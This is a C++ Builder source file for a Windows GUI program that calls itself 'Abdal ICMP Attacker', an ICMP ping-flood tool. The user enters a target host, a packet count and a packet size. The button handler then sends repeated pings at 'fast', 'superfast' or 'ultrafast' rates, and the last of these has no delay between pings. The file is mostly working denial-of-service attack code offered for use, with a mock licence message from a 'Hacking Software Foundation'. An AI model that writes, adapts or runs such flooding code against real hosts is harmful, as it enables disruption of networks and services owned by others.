//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit3.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm3 *Form3;

//---------------------------------------------------------------------------
__fastcall TForm3::TForm3(TComponent* Owner)
	: TForm(Owner)
{
}
//---------------------------------------------------------------------------


void __fastcall TForm3::RadioButton1Click(TObject *Sender)
{
		Edit1->Text = "";
		Edit1->Enabled = 1;
        Edit1->SetFocus();
		

}
//---------------------------------------------------------------------------

void __fastcall TForm3::RadioButton2Click(TObject *Sender)
{

		Edit1->Enabled = 1;
		Edit1->Text = "";
		
		
		Edit1->Text = "www.";
        Edit1->SetFocus();



}
//---------------------------------------------------------------------------


void __fastcall TForm3::BitBtn2Click(TObject *Sender)
{
 MessageBoxA(Handle, "Abdal ICMP Attacker Ver 1.0 Copyright \(C\) \<2016-2017\>  <Ebrahim Shafiei>\n This program is free software: But you can not redistribute it and/or modify\n it under the terms of the  Abdal General Private License  as published by \n the  Hacking Software Foundation  ,  either version 1 of the License, or  any later version.\n This program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nAbdal General Private License for more details.\n","About License", MB_OK);
}
//---------------------------------------------------------------------------

void __fastcall TForm3::BitBtn1Click(TObject *Sender)
{
        Image2->Visible = 0 ;
		ListBox1->Visible = 1 ;
        ListBox1->Items->Clear();
		int attacknum = LabeledEdit1->Text.ToInt();
		int myPacketSize = LabeledEdit2->Text.ToInt();
		icmp->Host = Edit1->Text;
		icmp->PacketSize =  myPacketSize;
		int fast = RadioButton3->Checked;
		int superfast = RadioButton4->Checked;
		int ultrafast = RadioButton5->Checked;



		
			// ########################## For Fast Icmp 
			if (fast == 1) {

							for (int i = 0; i <= attacknum ; i++) {
				   
				try {
						Sleep(800);
						icmp->Ping();
				   Application->ProcessMessages();
				   
					} //End Of Try
				 catch (...) {
							  ListBox1->Items->Add("Attack Failed");
							  Application->ProcessMessages();
							 }    // end Of Catch
		
		
			
										} // end Of Attack Loop

											  
                
												}// Radio 3
			 // ########################## For Fast Icmp



			  // ########################## For Super Fast Icmp 

			   

				 else if (superfast == 1 ) {

					
                                      	for (int i = 0; i < attacknum ; i++) {
				   
				try {
						Sleep(100);
						icmp->Ping();
				   Application->ProcessMessages();
				   
					} //End Of Try
				 catch (...) {
							  ListBox1->Items->Add("Attack Failed");
							  Application->ProcessMessages();
							 }    // end Of Catch
		
		
			
										} // end Of Attack Loop

								
														 
								}   // Radio 4

				// ########################## For Super Fast Icmp 






				// ########################## For Ultra Fast Icmp 

				
				else if (ultrafast == 1)   {


										for (int i = 0; i < attacknum ; i++) {

				try {

						icmp->Ping();
				   Application->ProcessMessages();
				   
					} //End Of Try
				 catch (...) {
							  ListBox1->Items->Add("Attack Failed");
							  Application->ProcessMessages();
							 }    // end Of Catch
		
		
			
										} // end Of Attack Loop

								
														 
								}   // Radio 4

				// ########################## For UltraFast Icmp

				else {

                     MessageBoxA(Handle, "Select The Attack Power Method ","Error !", MB_OK);
				}

		
} // End The Attack BT
//---------------------------------------------------------------------------

void __fastcall TForm3::icmpReply(TComponent *ASender, TReplyStatus * const AReplyStatus)
          
{
		UnicodeString Result ;
		Result = " Recieved " + UnicodeString(AReplyStatus->BytesReceived)+
				 " Bytes From " + AReplyStatus->FromIpAddress + 
				 " Time = " +  UnicodeString(AReplyStatus->MsRoundTripTime)+
				 " Ms, TTL = " + UnicodeString((int)AReplyStatus->TimeToLive);
				 ListBox1->Items->Add(Result);
}
//---------------------------------------------------------------------------


void __fastcall TForm3::FormShow(TObject *Sender)
{
	/*
	RadioButton1->TabOrder = 1;
		RadioButton2->TabOrder = 2;
		Edit1->TabOrder = 3  ;
		LabeledEdit1->TabOrder = 4 ;
		LabeledEdit2->TabOrder = 5 ;
		RadioButton3->TabOrder = 6 ;
		RadioButton4->TabOrder = 7 ;
		RadioButton5->TabOrder = 8;
		BitBtn1->TabOrder = 9 ;
		BitBtn2->TabOrder = 10;


	*/

	GroupBox1->SetFocus();
}
//---------------------------------------------------------------------------

